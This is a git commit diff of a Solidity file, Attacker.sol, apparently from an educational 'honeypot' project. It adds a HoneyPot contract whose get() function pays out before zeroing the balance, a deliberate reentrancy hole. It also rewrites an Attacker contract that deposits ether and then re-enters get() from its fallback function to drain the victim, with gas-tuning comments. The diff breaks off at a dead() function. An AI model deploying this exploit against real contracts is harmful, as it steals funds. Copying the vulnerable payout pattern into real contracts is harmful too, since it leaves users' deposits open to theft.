b629327232cf65f41d8016852e50d3e07ca75a9d
rafaelfuentesh <rafaelfuentesh@gmail.com>
2018-05-05 02:27:15 -0300

    update with get and put together, use less gas

--- honeypot/contracts/Attacker.sol
+++ honeypot/contracts/Attacker.sol
@@ -1,26 +1,48 @@
-pragma solidity 0.4.19;
+pragma solidity 0.4.23;
+
+contract HoneyPot {
+    mapping (address => uint) public balances;
+
+    function HoneyPot() payable {
+        put();
+    }
+
+    function put() payable {
+        balances[msg.sender] = msg.value;
+    }
+
+    function get() {
+        require(msg.sender.call.value(balances[msg.sender])());
+        balances[msg.sender] = 0;
+    }
+
+    function() {
+        revert();
+    }
+}
 
 contract Attacker {
     HoneyPot victim;
-    uint public count;
     address owner;
     
-    event logger(uint count, uint balance);
-    
-    function Ataccker(address _victim) payable public {
-        victim = HoneyPot(_victim);
-        victim.put.value(msg.value)(); // i put 0.5 ether
+    event logger(uint balanceV, uint balance);
+
+    function Attacker() public {
         owner = msg.sender;
     } 
-
-    function attack() public {
-        victim.get();
-    }
     
+    function attack(address _victim) payable public {
+        victim = HoneyPot(_victim);
+        victim.put.value(msg.value)(); // i put 0.5 ether
+        victim.get();
+    } 
+
     function () payable public {
-        count++;
-        logger(count, this.balance);
-        if (count < 11) victim.get(); // i get 5.5 ether i need my 0.5 ether back :D
+        logger(victim.balance, this.balance); 
+        // with only first condition gas: 765776 
+        // with 2 condition gas: 232686 
+        // with 3 condition gas: 232976 
+        if (msg.value < victim.balance && this.balance < 5000000000000000000 && msg.gas > 300000) victim.get(); // stop when no more balance
     }
     
     function dead() public {
